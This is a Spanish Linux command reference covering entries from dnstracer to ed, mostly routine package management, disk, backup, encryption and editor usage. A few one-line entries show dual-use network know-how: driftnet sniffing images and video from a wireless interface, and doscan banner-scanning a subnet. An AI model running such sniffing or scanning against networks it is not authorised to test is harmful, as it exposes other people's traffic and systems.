Consultas DNS desde una ip o un host. dnstracer determina cuando un servidor de nombres de dominio [DNS] obtiene información de un nombre de anfitrión dado, y a continuación el servidor DNS manda la respuesta de autorización.
$ dnstracer host


dnstraceroute
[dnsdiag]. Se utiliza para rastrear la ruta que toma una solicitud DNS de origen al destino. Su propósito es detectar si una solicitud es redirigida o secuestrada. Esto se puede hacer comparando diferentes consultas DNS que se envían al mismo servidor DNS usando dnstraceroute y observar si hay alguna diferencia en la ruta.
# dnstraceroute facebook.com (forma básica)
# dnstraceroute -e -C -t A -s 8.8.4.4 facebook.com (impimiendo las sugerencias de los expertos si eestan disponibles, a todo color y usando las DNSs de google))


do-release-upgrade
Herramienta para actualizar por consola sistemas basados en Ubuntu a una nueva versión de la distribución. Para configurar si queremos actualizar entre versiones normales o versiones LTS, debemos modificar del fichero /etc/update-manager/release-upgrades la linea:
Para versiones LTS:
Prompt=lts
Para versiones normales:
Prompt=normal
Para no verificar nunca nuevas versiones:
Prompt=never
Estas modificaciones son válidas también para update-manager [ver]
# do-release-upgrade -d


doc-debian
El Proyecto Debian es una asociación de individuos que han hecho causa común para crear un sistema operativo libre. En este paquete, se encuentra: Manifiesto de Debian Linux, Constitución del Proyecto Debian, Contrato Social de Debian, Directrices de Software Libre de Debian, Documentación del Sistema de Seguimiento de Fallos de Debian y una introducción a las listas de correo de Debian. Todos estos archivos están disponibles en http://ftp.debian.org/debian/doc/.


dochelp
Documentación sobre comandos del sistema.
$ dochelp (Muestra el listado)
$ nano /usr/share/doc-base/time


dog
Parecido a cat.


dontzap
Activa CRTL+ALT+Retroceso para reiniciar las X
dontzap -d     (Lo activa)
dontzap -e      (Lo desactiva)


doas
Permite ejecutar comandos como otro usuario, generalmente con privilegios de root similar a sudo. Primero crear el archivo:
# nano /etc/doas.conf
  - entrar el grupo del usuario con permisos root para ejecutar algún comando [cmd apt]:
  permit :USER as root cmd apt
  - permitir a usuario ejecutar todos los comandos como root
  permit nopass USER as root
  - Prohibir al usuario juan ejecutar el comando fdisk
  deny juan cmd fdisk
Especificar los permisos y propietario del archivo:
# chown -c root:root /etc/doas.conf
# chmod -c 0400 /etc/doas.conf
Luego el usuario especificado en el archivo podrá, por ejemplo, ejecutar:
$ doas apt update (en el primer caso)
$ doas -u root bash (iniciar sesión como root)
Algunas opciones que podemos colocar en el archivo de configuración:
        permit nopass :otros (Permitir que todos los usuarios del grupo "otros" realicen acciones como root sin autenticación)
        permit persist USER (Una vez que el usuario se autentica exitosamente, no solicitar una contraseña nuevamente por algún tiempo.



dool
Herramienta para monitorear muchos aspectos del sistema: CPU, memoria, red, promedio de carga, etc.
$ dool --more 3  (actualizar datos cada 3 segundos. Por defecto cada segundo)
$ dool --net -N enp1s0 (del tráfico de red de la interfaz espedificada)
$ dool --cpu --time 2 (cada 2 segundos)
$ dool --full (monitorear todos los aspectos de la aplicación)


dos2unix
Convertir un formato de fichero texto MSDOS a UNIX.
$ dos2unix filedos.txt fileunix.txt


doscan
Scanner de interfaces para conocer los servicios de red activos.
# doscan --banner 100 --port 22 192.0.2.0/24


dosfsck
Comprobar y reparar sistemas de archivos MS-DOS
# dosfsck -altrvV /dev/sdbx
-a (repara automaticamente)
-l  (Lista las rutas de los archivos procesados)
-t  (Marca los clusters inaccesibles como dañados.)
-r  (Repara el sistema preguntando cuando hay varias soluciones)
-v  (Modo detallado)
-V  (Realiza una pasada de verificación)


dot
Lenguaje de descripción de gráficos. Los gráficos generalmente se almacenan con la extensión de nombre de archivo .gv o .dot aunque se prefiere .gv para evitar confusiones.
$ gpicview output.svg (Para visualizar los gráficos de los siguientes ejemplos)
$ echo 'digraph { a -> b }' | dot -Tsvg -o output.svg
$ echo 'digraph { a -> b }' | dot -Tpng -Gfontcolor=red -Glabel="Gráfico importante" -o output.png
$ echo 'digraph { a -> b }' | dot -Tsvg -Nfontcolor=red -Nshape=rect -o out.svg
$ echo 'digraph { a -> b }' | dot -Tsvg -Ecolor=red -Earrowhead=diamond -o out.svg
$ echo 'digraph { a -> b }' | dot -Tsvg -o output.svg
$ dot -Tsvg -O ~/graph1.gv ~/graph2.gv (generar automaticamente graph1.svg y graph2.svg)
$ dot -P -Tsvg -o plugins.svg (ver gráfico de todos los plugins del ejecutable)
Algunos ejemplos más complejos:
1.-
$ echo 'digraph sample3 {
A -> {B ; C ; D}
C -> {B ; A}
}' | dot -Tpng -Nfontcolor=red -Nshape=oval -Glabel="Gráfico importante" -Nstyle=bold -o output.png
2.-
$ echo 'digraph test123 {
               a -> b -> c;
               a -> {x y};
               b [shape=box];
               c [label="hello\nworld",color=blue,fontsize=24,
                    fontname="Palatino-Italic",fontcolor=red,style=filled];
               a -> z [label="hi", weight=100];
               x -> z [label="multi-line\nlabel"];
               edge [style=dashed,color=red];
               b -> x;
               {rank=same; b x}
       }
' | dot -Tpng -Nfontcolor=red -Nshape=box -Glabel="Gráfico importante" -Nstyle=invis -o output.png


downgrade
Bajar versión a un programa instalado.
# downgrade firefox
Mostrará la salida: “please choose a version, [s]earch A.R.M., or [q]uit:”
Pulsando “s” mostrará las versiones disponibles para ser instaladas.


downtimed
Demonio para monitorear y llevar un registro del tiempo de inactividad del sistema operativo, paradas y bloqueos. Los registros se realizan en /var/lib/downtimed/
# service downtimed status (para saber si está activo)


dpigs
[debian-goodies]. Muestra los paquetes que ocupan más espacio.
$ dpigs (Los primeros diez 10. Opción por defecto)
$ dpigs -n 20 (Los primeros 20)
$ dpigs -S (Muestra los paquetes fuente más grandes instalados en el sistema)
$ dpigs -H -n 15 (en medidas entendibles y los 15 que ocupan más espacio)


dpkg
Gestor de programario de distros derivadas de Debian
# dpkg -i paquete   (Instalación de paquetes .deb)
# dpkg -r paquete   (Desinstala un paquete)
# dpkg --purge paquete    (Desinstala junto sus archivos de configuración)
# dpkg --audit   (Visualizar paquetes instalados parcialmente)
# dpkg --force -r paquete  (Fuerza la desinstalación de un paquete)
# dpkg --force-all -r paquete  (Fuerza más la desinstalación de un paquete)
# dpkg --purge --force-all paquete (Otra opcioón para desinstalar un paquete)
# dpkg -c paquete   (Muestra los ficheros de un paquete)
# dpkg --yet-to-unpack  (paquetes descargados sin instalar)
# dpkg -C   (Muestra los instalados parcialmente)
# dpkg -L paquete  (Ficheros que se instalaron con un paquete)
$ dpkg -l inkscape  (Conocer si un paquete está instalado y su versión)
# dpkg -l 'emacs*' (listará todos los paquetes instalados o no, cuyo nombre coincida con el argumento pasado)
# dpkg -l 'emacs*' | grep '^un' (Mostrar los no instalados)
# dpkg -S fichero    (Muestra a qué paquete pertenece un fichero)
# dpkg --get-selections   (Muestra todos los paquetes instalados en el sistema)
# dpkg --get-selections | cut -f1 (Lo mismo más fino)
# dpkg --get-selections > lista.txt    (Los manda a un fichero)
# dpkg --get-selections | grep python (muestra todos los paquetes python)
# dpkg -l > llistat.txt      (Manda a un fichero todos los paquetes Debian)
# dpkg --status paquete  (Info, dependencias, recomendaciones, sugerencias)
# dpkg -install paquete --force-conflicts (instalar un paquete conflicitivo)
# dpkg --print-architecture (mostrar la arquitectura de un pc)
# dpkg-reconfigure paquete    (Reconfigura paquetes instalados)
# dpkg-reconfigure -phigh -a   (Reconfigurar todo el sistema)
# dpkg-reconfigure debconf    (R. interfaz de configuración)
# dpkg-reconfigure xserver-xorg  (R. el servidor X)
# dpkg-reconfigure console-common (R. el teclado)
# dpkg-reconfigure console-setup (mismo que lo anterior)
# dpkg-reconfigure locales     (R. el lenguaje)
# dpkg-reconfigure tzdata      (R. la zona horaria)
# dpkg-reconfigure console-data (R. las tty)
# dpkg-reconfigure -a (Borra paquetes de configuraciones)
# dpkg-reconfigure fontconfig-config  (R. fuentes. Seguir con:)
# dpkg-reconfigure fontconfig  (R. fuentes)
# dpkg --configure -a  (R. inconsistencias o procesos despues de un cuelgue)
# dpkg-query -W paquete (Ver versión de un paquete)
# dpkg -i --force-overwrite /var/cache/apt/archives/paquete.deb (forzar install)
# dpkg -b deb paquete.deb (Convertir la carpeta “deb” en un archivo “.deb”)
1.-
En ocasiones, algún paquete medio o mal instalado puede bloquear la aplicación. En estos casos puede usarse:
# rm /var/lib/apt/lists/* -vf
Y a continuación:
# apt-get update
2.-
Forzar desinstalación de paquetes resistentes.
	# dpkg --purge --force-remove-reinstreq paquete
	# dpkg --listfiles paquete_dañado
	# gedit /var/lib/dpkg/status (eliminar la sección paquete_dañado)
	# gedit /var/lib/dpkg/available   (eliminar la sección paquete_dañado)
	# dpkg -l | grep ^rc | awk '{print $2}' | sudo xargs dpkg -P  (suprimir residuos de instalaciones)
3.-
Otra forma de forzar la desinstalación de paquetes conflictivos:
	# rm /var/lib/dpkg/info/paquete
	# dpkg -r --force-remove-reinstreq paquete
	# dpkg -l | sed '/^rc/!d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/' | xargs -r sudo apt-get -y purge (Suprimir configuraciones residuales y huerfanas)
4.-
Otro modo de suprimir archivos de configuración huerfanos (rc):
	# dpkg -l | grep ^rc (Comprobar si tenenos paquetes de estas caracteristicas)
	# dpkg -P $(dpkg -l |awk '/^rc/ { print $2 }') (Eliminarlos)
5.-
Añadir arquitectura 386 a una máquina amd64 para permitir instalar paquetes sólo disponibles para aquella arquitectura:
# dpkg --add-architecture i386
# apt-get update
6.-
Limpiar paquetes obsoletos:
# dpkg -l | grep -i ^rc (Para visualizarlos)
# dpkg -l |grep -i ^rc | cut -d " " -f 3 | xargs dpkg --purge (Para eliminarlos)
7.-
Otro proceso para reparar paquetes rotos en el sistema
    # dpkg --configure -a (recomfigurar posibles paquetes pendientes)
    # apt-get clean && sudo apt-get autoclean (limpiar caché)
    # rm /var/lib/apt/lists/lock && rm /var/cache/apt/archives/lock && rm /var/lib/dpkg/lock
    # apt-get update --fix-missing (regenerar listados de paquetes de los repositorios)
    # apt-get install -f (corregir dependencias rotas


dpkg-depcheck
Determina los paquetes utilizados para ejecutar un comando. Este programa ejecuta el comando especificado bajo strace y luego determina y saca los paquetes usados en el proceso.
$ dpkg-depcheck -b ip a
$ dpkg-depcheck -a ls


dpkg-divert
Herramienta para instalar un paquete en una ubicación no predeterminada. Las ubicaciones alternativas de un archivo que se realizan mediante la orden dpkg-divert son una forma de obligar a dpkg a instalar un archivo en una ubicación alternativa y no en su ubicación por defecto. Su utilización es una práctica en desuso.


dpkg-query
Herramienta para buscar información del paquete referenciado en la base de datos.
$ dpkg-query -l gedit (Muestra arquitectura, versión y descripción de gedit)
$ dpkg-query -L gedit (archivos instalados en el sistema desde el nombre del paquete)
$ dpkg-query -s gedit (muestra el estado del paquete)


driftnet
Snifer de imagenes y video
# driftnet -i wlan2


driverless
Lee el fichero /usr/lib/cups/driver/ para enumerar las impresoras sin controlador disponibles.
$ driverless list (listado)


droopy
Mini web server para recibir archivos.
$ mkdir fotos (crear el directorio donde recibir las imagenes que nos han de enviar)
$ cd fotos
$ droopy -m "Buenassssss, puedes enviarme las fotos que quieras" -p ~/gnu.png -d ~/imagenes (con el texto que queremos [m], ilustrado con la imagen deseada [p] y que lo que nos envien se guarde en la carpeta especificada [d])
Accedemos en local con la dirección http://localhost:8000 y en remoto han de acceder, si no tenemos nombre de host registrado, con http://nuestra_ip:8000/fotos


dropbox
Almacenamiento en la nube. Linea de comandos para el servicio Dropbox.
$ dropbox status (Muestra el estado actual del demonio)
$ dropbox help update (Muestra información sobre el comando que se especifique)
$ dropbox puburl archivo (Muestra una URL de "archivo" para compartir)
$ dropbox stop (Para el servicio)
$ dropbox running (Comprobar si está activo el demonio)
$ dropbox update (Descargar la última versión de dropbox)
$ dropbox start (Arranca el servicio)
$ dropbox start -i (Arranca el servicio e instala el demonio dropboxd si no está disponible en el sistema)
$ dropbox filestatus -l -a directorio (Lista los archivos del directorio especificado incljuso los ocultos)
$ dropbox filestatus fichero (Muestra el estado del fichero)
$ dropbox autostart (Si respondemos "n" dropbox no se iniciará automáticamente al iniciar la sesión. Por defecto "y": si)
$ dropbox exclude list (Muestra los directorios excluidos de la sincronización)
$ dropbox exclude add dir1 (Excluir un directorio de la sincronización)
$ dropbox exclude add dir1 dir2 (Excluir varios directorios)
$ dropbox exclude remove dir1 (Elimina un directorio de la lista de exclusión)
$ dropbox lansync (Por defecto usa sincronización LAN. Si respondemos "n" no la usará)
1.-
Activar la carpeta "Public" en nuestra cuenta. Visitar la siguiente dirección web <https://www.dropbox.com/enable_public_folder>
Tras la confirmacón aparecerá en nuestra cuenta de Dropbox.


droppy
Mini servidor web cuyo único propósito es permitir que otros carguen archivos a tu computadora. El proceso es:
   $ mkdir ~/descargas (crear directorio donde irá lo que envien)
   $ cd descargas (entrar en el directorio)
   $ droopy -m "Buenas, soy GNU, ¿quieres subir alguna cosa?." -p /home/pep/Imatges/gnu1.png (lanzar droppy con el texto y la imagen que veran en la web)
Para comprobar si el sistema está en servicio, en el navegador colocar la dirección http://localhost:8000 y haciendo clic en "Discover the address of this page" [Descubre la dirección de esta página] se informa la ip donde enviar las fotos.


dselect
Paquete obsoleto sustituido por aptitude.


dstat
Monitor  de trafico de red
# dstat (uso básico)
# dstat -c --top-cpu -dn --top-mem (uso de CPU, proceso que más usa la CPU, estadistica de disco y red y proceso que consume más memoria)


dte
Editor de texto por consola mínimo.
$ dte


dtrx
Descompresor de archivos comprimidos en varios formatos [ tar, zip, rpm, deb, gem, 7z, cpio, rar, bzip2, gzip...]
$ dtrx -r archivo.zip (descomprimir de forma recursiva el zip y todos los comprimidos de su interior)
$ dtrx -l archivo.zip (Lista los archivos de archivo zip)


du
Mostrar el espacio usado por los directorios
$ du -a (Para todos los ficheros, no solo los directorios)
$ du -h (Da los resultados en M y G, por defecto son en bytes)
$ du -s (Muestra los totales del directorio o archivo especificados)
$ du -x (Calcular tamaño sin sumar los puntos de montaje)
$ du fichero (Muestra el tamaño de fichero)
$ du | sort -rn | head (Mostrar los 10 archivos que más ocupan)
$ du -sch .[!.]* * | sort -h (Mostrar también las carpetas ocultas y ordenar el resultado)


duc
[libncursesw5-dev libcairo2-dev libpango1.0-dev build-essential]. Herramienta que permite examinar el contenido de nuestro disco. Esta herramienta genera una base de datos con la cual podemos analizar mejor el contenido almacenado.
# duc index /etc (generar la base de datos del directorio /etc)
# duc ls -Fg /etc (ver el contenido y el peso de cada carpeta del directorio del que se ha creado la base de datos)
# duc gui /etc (mostrarlo de forma gráfica)
# duc graph (muestra un gráfico del presente directorio con el nombre duc.png)


duck
Verificador d'URL de Debian. Procesa diversos campos de los ficheros debian/control, debian/upstream, debian/copyright, debian/patches/* y systemd.unit y comprueba si las URLs, los enlaces VCS y los dominios de direcciones de correo electrónico que se encuentran en ellos son validosd'.
$ duck -v


duckduckgo
Buscador alternativo que respeta la privacidad del usuario.
Filtros:
	site:lapipaplena.net (Busca en la url especificada)
	qrcode "linux es un sistema genial" (Crear código QR de un texto)
	md5 lapipaplena (Generar un hash de un texto en md5)
	base64 encode "Un texto" (Generar un hash en base64)
	anagram "linux es genial" (Generar un anagrama [cambio de posición de los carácteres)
	shorten http://lapipaplena.net (Acortador de URL)
	maps ibiza (Muestra el mapa solicitado)
	@templix (De un usuario de twitter)
	recipes "tortilla de patatas" (Recetas de cocina)
	color codes (Muestra los códigos de los colores)
Algunos comandos para utilizar en buscadores externos [Bangs]
	!wes (Busca en la wikipedia en español)
	!github (En github)
	!b (En bing)
	!meneame (En meneame)
	!tw (En twitter)
	!fb (En facebook)
	!flickr (En flickr)
	!grooveshark (En grooveshark)
	!y (En yahoo)
	!enes (En google translate inglés-español)
	!gplus (En google+)
	!g (En google)
	!gi (En google images)
	!m (En google maps)
	!gmail (En gmail)
	!ebay (En ebay)
Algunos atajos:
	d (Busca más resultados en el sitio web resaltado)
	Ctrl+enter (Abre resultado en una nueva ventana)
	Ees (Sale de la caja de búsqueda y va a los resultados)
	h (Coloca el cursor en la caja de búsqueda)
	r (Si existe, va a los relacionados)
	s (Si existe, va al enlace sugerido
	t (Va al inicio de la página)


duf
Ver espacio de disco ocupado. Como df más colorida. Descarga:
$ wget https://github.com/muesli/duf/releases/download/v0.3.1/duf_0.3.1_linux_amd64.deb
# dpkg -i duf_0.3.1_linux_amd64.deb
$ duf -hide-special (lanzar la aplicación)
$ duf (mostrando dispositivos locales y especiales)
$ duf -theme ansi (con determinado tema)
$ duf -all (incluir atributos de todas las perticiones)


duff
Buscar archivos duplicados.
$ duff -a (De forma recursiva en todo el presente directorio)
$ duff -r Documentos (Especificando un directorio)


dump
Copia de seguridad de archivos, directorios o particiones. Para restaurar la copia de seguridad ver comando “restore”.
$ dump -0vf home.bak /home/usuario/ (Completo [0], incremental sería 1, mostrando información [v] y especificando fichero [f]


dump-acct
Imprime una lista de todos los inicios de sesión. La lista está, generalmente, en /var/log/wtmp. Todos los campos estan separados por una linea vertical y son: user, name, tty, type, id, pid, hostaddr, host, time.
# dump-acct /var/log/wtmp
# dump-acct -n 10 /var/log/wtmp (solo imprimir en pantalla 10 lineas)


dumpe2fs
Muestra información de ficheros ext2/3
# dumpe2fs /dev/sda1
Nota.- El porcentaje de bloques reservados para el usuario root en los sistemas de archivo ext2/3 normalmente es de un 5%. Esta cifra se obtiene de los datos “Reserved block count” y “Block count”. Con tune2fs podemos modificar este porcentaje, por ejemplo al 1%:
# tune2fs -m 1 /dev/sda1


dump.exfat
Imprime información de un dispositivo dado que está formateado por el sistema de archivos exFAT.
# dump.exfat /dev/sda3


dumpkeys
Permite obtener el mapa de teclas (Keymap) utilizado por el controlador de teclado actual.
# dumpkeys -i
# dumpkeys -f (completo)


dumppdf
Vuelca el contenido interno de un archivo PDF a formato pseudo-XML.
$ dumppdf -a file.pdf (Volcar todos los encabezados y contenidos, excepto los objetos de flujo)
$ dumppdf -T file.pdf (Volcar la tabla de contenido)


duplicity
Herramienta para realizar backups tanto en modo local como remoto
# duplicity full /home file:///backups/ (realiza un backup copmpleto [full] en modo local de la carpeta /home en la carpeta /backups)
$ duplicity /home/usuario scp://usuario@host/dir (Backup de un directorio local a un servidor remoto)
Algunas opciones:
	--no-encryption (Sin codificar. Por defecto codifica los archivos en el destino)
	--include /home/usuario/datos/documentos (Backups de un subdirectorio especifico)
	--remove-all-but-n-full 1 --force (Sólo dejará en destino la última copia "full", borrando la anterior y las incrementales que dependen de ella)


durep
Monitorear el uso del disco. Genera una salida con texto y barras gráficas.
$ durep /var/www (uso básico)
$ durep -td 2 (hasta una profundidad de 2 subdirectorios del directorio actual)
$ durep -f /var/www/html (escanear solo archivos sin descender a directorios)
$ durep -c /var -sf /var/lib/durep/(generando un archivo .cds de /var y guardarlo en el directorio especificado)
$ durep -lf /var/lib/durep/durep.cds (cargar los resultados del archivo)


dust
Mostrar espacio usado por archivos y directorios. Como du más colorido.
$ dust (forma básica)
$ dust -i (sin archivos ocultos)
$ dust -p (mostrar rutas completas)
$ dust -b (sin mostrar porcentages)
$ dust -x avi (sin mostrar los que contengan avi en su nombre)


dutree
Analisis del uso del disco duro en forma de arbol. De forma predeterminada, dutree muestra un tamaño de archivo de 1 M
$ dutree (forma básica)
$ dutree -s -H (resumen completo y sin mostrar archivos ocultos)
$ dutree -u (ver el uso real del disco duro en lugar del tamaño del archivo)
$ dutree -d 3 (hasta una profundidad de 3 subdirectorios)
$ dutree -f (omitiendo directorios)
$ dutree -a (ver incluso los de menor tamaño que 1 M)


dvdauthor
Crear videos compatibles con reproductores domesticos [genera los directorios VIDEO_TS y AUDIO_TS]. Ver página man para una muestra del archivo de control.
$ dvdauthor -o directorio archivo_control.xml
$ dvdauthor -o mi_dvd -T (crear table de contenidos)


dvdbackup
[dependencias: libdvdread, libdvdcss]. Ripeo de dvds.
$ dvdbackup -i /dev/cdrom  (/información del dvd)
$ dvdbackup -M -i/dev/cdrom -o/home/usuario/carpeta_destino (lanzar la aplicación)


dvd+rw-format
Formatear dvd +- Rw
$ dvd+rw-format -force /dev/cdrom


dvgrab
Catura de videos desde una cámara digital DV.
Previas:
# modprobe rw1394
# chmod o+rw /dev/raw1394
Uso:
$ dvgrab --buffers 500 (Los videos se almacenarán de forma secuencial [001.avi, 002.avi...] y 500 frames. Por defecto 100)
$ dvgrab -f avi -s 0 videos/archivo.avi (Especificando formato, sin perdida de calidad y destino)
Algunas opciones:
	-a 30 (crear nuevo archivo cada 30 segundos
	-csize 5 (divide el archivo de captura cuando llega a 5MB)
	-debug all (mostrar información de la captura.
	-d 10,20 (tiempo total a capturar en formato SMIL. Por defecto ilimitado
	-every 50 (grabar un cuadro cada 50)
	-f dif (formato de captura. Por defecto raw. Algunos formatos: dif [raw con extensión .dif], qt [formato QuickTime], mpeg2 [compresión MPEG-2], jpeg [secuencia de imágenes]
	-F 20 (cantidad máxima de fotogramas por archivo. Por defecto ilimitado)
	-nostop (no detener la reproducción en el dispositivo al cerrar la captura)
	-rewind (rebobina el MiniDV al finalizar)
	-t (poner fecha y hora de registro como nombre del archivo)


dvtm
Terminal multiplexor
$ dvtm (Lanza la aplicacion)
Algunos atajos
	Ctrl+g c (Crear una nueva ventana)
	Ctrl+g x (Cerrar la ventana enfocada)
	Ctrl+g l (Aumenta el ancho de la ventana enfocada)
	Ctrl+g h (Disminuye la anchura de la ventana enfocada)
	Ctrl+g j (Cambiar el foco a la siguiente ventana)
	Ctrl+g k (Cambiar a la ventana anterior)
	Ctrl+g 3 (Ir a la ventana 3 contando desde la esquina superior izquierda)
	Ctrl+g espacio (Redisea todas las ventanas)
	Ctrl+g t (Cambiar el diseño de mosaico a pila vertical)
	Ctrl+g b (Cambiar a diseño de mosaico)
	Ctrl+g g (Cambiiar a diseño de cuadrícula)
	Ctrl+g l (Redibujar toda la pantalla)
	Ctrl+g q (Salir)


dwb
Navegador minimalista con soporte para flash.
Atajos: dwb:keys
Configuración: dwb:settings
Las configuraciones en texto plano en .config/dwb/
Algunos atajos:
	o (Para entrar una url)
	O (abrirla en una nueva pestaña)
	J (Cambiar entre pestañas)
	j (bajar por la página)
	k (subir)
	d (cerrar pestaña)
	u (reabrir pestaña cerrada)
	go (Editar la url)
	r (Recargar la página)
	R (Recargar sin usar la caché)
	f (Marcar los enlaces para escoger el que proceda)
	F (Marcar los enlaces y abrir el escogido en nueva pestaña)
	i (Modo insert para insertar en algún cuadro de dialogo)
	Esc (Volver a modo normal)
	M (Entrar url en en laces de interés)
	ctrl q (Para salir del navegador)


dwww
Visualizar documentación (páginas man, info, README...) en el navegador. El archivo de configuración en /etc/dwww/dwww.conf. Se accede con http://localhost/dwww/index.html


dzdo
Se utiliza para ejecutar comandos con los privilegios de otro usuario.
$ dzdo -u root apt update (ejecutar "apt update" como usuario root)


dzegrep
Busqueda a través de archivos que pertenecen a un paquete Debian instalado. Parecido a degrep
$ dzegrep goodies debian-goodies
$ dzegrep dpigs debian-goodies


dzfgrep
Igual que dzgrep y dzegrep


dzgrep
Busqueda a través de archivos que pertenecen a un paquete Debian instalado. Parecido a degrep
$ dzgrep goodies debian-goodies
$ dzgrep dpigs debian-goodies


e2fsck
Optimizar y reparar particones ext2 y ext3. Preciso desmontarla.
# e2fsck -b 8193 /dev/hda2  ("-b 8193"que use la informacion de la primera copia del super bloque para reparar los daños.)
# e2fsck -fpDv /dev/sda1 (para optimizar la partición)
Nota.- "-c" buscar y marcar los bloques dañados, "-D" Optimiza, "-f" fuerza, "-p" repara y "-v" informa


e2fsprogs
Utilidades para los sistemas de ficheros ext2 y ext3. Incluye los ejecutables: badblocks [buscar bloques dañados en un dispositivo ], blkid [mostrar atributos de dispositivos de bloque], compile_et [compilador de tablas de error], debugfs [depurador de sistemas de ficheros], dumpe2fs [información del superbloque y de los grupos de bloques], e2fsck [chequear y reparar sistemas de ficheros], e2image [salvar información de un sistema de ficheros], e2label [muestra o cambia la etiqueta de un sistema de ficheros], findfs [encuentra un sistema de ficheros por su etiqueta o UUID], fsck, fsck.ext2 y fsck.ext3, [chequear y reparar un sistema de ficheros], logsave [salva la salida de un comando en un fichero de registro], mk_cmds [convierte tabla de nombres de comandos y mensajes de ayuda en un fichero fuente], mke2fs, mkfs.ext2 y mkfs.ext3 [crear sistemas de ficheros ext2 y ext3 en un dispositivo], mklost+found [crear un directorio lost+found en un sistema de ficheros], resize2fs [redimensionar sistemas de ficheros], lsattr [muestra los atributos de un fichero en un sistema de ficheros], chattr [cambia los atributos de los ficheros], tune2fs [ajusta los parámetros de un sistema de ficheros] y uuidgen [crea un nuevo identificador UUID].


e2image
Genera una imagen de una partición ext2/ext3/ext4 y otros. También usado para redimensionar y mover particiones
# e2image /dev/sda2 copia.img
# e2image -ra -p -O 21623734272 /dev/sda1 (Mueve la partición al punto definido por el parametro -O. Se debe reducir la partición previamente con resize2fs)


e2label
[ntfsprogs]. Poner etiquetas a las particiones y dispositivos ext3
# e2label /dev/dispositivo_usb mi_usb  (cuando se conecte, en el escritorio aparecerá el icono con el nombre “mi_usb”)
# e2label /dev/sda5  (dirá si la partición sdb5 tiene nombre de etiqueta)


e2undo
Cuando la aplicación e2fsprogs falla, e2undo restablece el sistema de ficheros  ext2/ext3/ext4 anterior del dispositivo.


e3
Editor que según como se lance usa la monenclatura de teclas de emacs, vi, pico ...
$ e3em archivo.txt (Usará las teclas de emacs)
$ e3vi archivo.txt (Usará las teclas de vi)


e4defrag
[e2fsprogs]. Desfragmentar particiones ext4.
# e4defrag /dev/sda2


ebook-
Convertir/visualizar a formato ebook.
$ ebook-convert texto.pdf texto.epub
$ ebook-viewer texto.epub (Visualiza con la apliciación calibre)


echo
Muestra o incluye algo en un fichero.
$ echo $$   (muestra el PID de la consola)
$ echo $PS1   (muestra el prompt)
# echo deb ftp://ftp.debian.org/debian etch main >> /etc/apt/source.list  (añade el repositorio mencionado al archivo sources.list)
Nota.- con un solo “>” pondria la linea especificada borrando todo lo demas.)
$ echo $((10*2)) (Realiza el cálculo matemático)
$ echo “ Buenas.. voy a reiniciar ¿Haces algo?” >> /dev/pts/23 (Manda el mensaje a la consola 23)
$ echo rm *.png (lista lo que se va a borrar, antes de lanzar rm *.png)
$ echo "" > archivo.txt (Borra el contenido de archivo.txt. Para un borrado total mejor usar $ :> archivo.txt)
$ echo -e "<?php\nphpinfo();\n?>" (la opción -e hace que se interprete los saltos de linea [\n], tabulaciones [\t] etc. en algunas distros es necesario lanzar: shopt -s extglob)
$ echo -e "linux\\tes\\tgenial" (tabular cada palabra con \\t. La primera barra [\] sirva para escapar el caracter \t)
$ echo -e "Dato1\n\tDato2\n\tDato3\n" > ejemplo.txt (entra datos en ejemplo.txt con salto de linea despues de cada dato)
$ echo "linux is beautiful" | tee -a *.txt (Mandar texto a varios archivos de texto)
$ echo !(HTMLS|plantilla*) (Es preciso activar: shopt -s extglob . Lisxta todo menos lo especificado)


ecryptfs
[ecryptfs-utils cryptsetup]. Sistema de ficheros que permite encriptar la informacion. Puede ser montado en un sistema de ficheros convencional [ext4, ext3...] lo cual siginifica que no tenemos que preocuparnos por asignarle espacio: conforme añadimos o eliminamos archivos, el espacio crece o decrece. Se podría coger un solo fichero encriptado, enviarse a otro PC y acceder a la información de ese fichero usando la misma contraseña.
1.-
Encriptar un directorio:
$ mkdir cripta (Crear directorio)
# chmod 700 cripta (Otorgarle permisos)
# mount -t ecryptfs cripta /media/tumba (Montar el directorio. Pregunta contraseña [la firma de la clave en el fichero /root/.ecryptfs/sig-cache.txt]. Las demás preguntas [método de cifrado, longitud de la contraseña...] pueden dejarse con las opciones por defecto)
# umount /media/tumba (Desmontar directorio)
Nota.- Es bastante usual, montar el directorio consigo mismo:
# mount -t ecryptfs cripta cripta
2.-
Ejecutar el asistente de creación de directorio cifrado:
# ecryptfs-setup-private
# ecryptfs-umount-private (Desmontar el directorio)
# ecryptfs-mount-private (Montar el directorio)
Nota.- Para impedir que el directorio creado se monte automáticamente al inicio de sesión, borrar el archivo ~/.ecryptfs/auto-mount. Para revertir el proceso crear en el mismo directorio un archivo vacio:
$ touch ~/.ecryptfs/auto-mount
3.-
Encriptar el directorio personal [$HOME]
Salir de la cuenta de usuario y entrar en la de root.
# modprobe ecryptfs (activar el módulo del kernel)
# ecryptfs-migrate-home -u USUARIO (Encriptar la $HOME del USUARIO)
Cerrar la cuenta de administrador y, sin reiniciar, entrar en la de USUARIO
$ ecryptfs-unwrap-passphrase (Pedirá la contraseña. Como medida de precaución es preciso anotar la cadena de texto que muestre)
# ecryptfs-setup-swap (Como media de seguridad es necesario encriptar la partición de intercambio [Swap])
# ecryptfs-rewrap-passphrase .ecryptfs/sig-cache.txt (Modificar la contraseña)


ebb
[= extractbb]. Para cada archivo JPEG, PNG o PDF dado en la línea de comandos, extractbb extrae la información del cuadro delimitador y la escribe en un archivo con extensión .xbb, junto con cierta información de cabecera. Estos archivos pueden ser utilizados por dvipdfmx u otros programas. Si se llama como ebb, la salida se escribe en formato bb (y con extensión .bb) que utiliza dvipdfm. Xbb puede definirse como sinónimo de extractbb en su sistema.
$ ebb -v file.png


ed
Editor de lineas.
Teclas de control:
	a (Añadir texto a partir de la línea indicada, o en la actual si no se indica)
	i (Inserta texto antes de línea indicada)
	c (Cambiar la línea o líneas indicadas)
	d (Borra la línea o las líneas indicadas)
	p (Visualiza la línea o el rango de líneas indicadas)
	n (Visualiza la línea o rango indicados mostrando su número)
	m3 (Mover la línea o rango de líneas a partir de la línea 3)
	t2 (Copiar la línea o rango de líneas indicado a partir de la línea 2)
	e[fic] (Carga el fichero indicado. No actúa si el fichero actual no está grabado)
	E[fic] (Carga el fichero indicado sin comprobar si el fichero actual está grabado o no)
	f[nombre] (Fija el nombre del fichero actual)
	r [fic] (Lee el fichero indicado añadiendo a partir de la línea indicada o de la última si no se indica)
	w [fic] (Graba las líneas indicadas, todas por defecto, en el fichero especificado o en el fichero actual por defecto)
	q (Sale del editor, emite un error si el fichero actual no fue grabado)
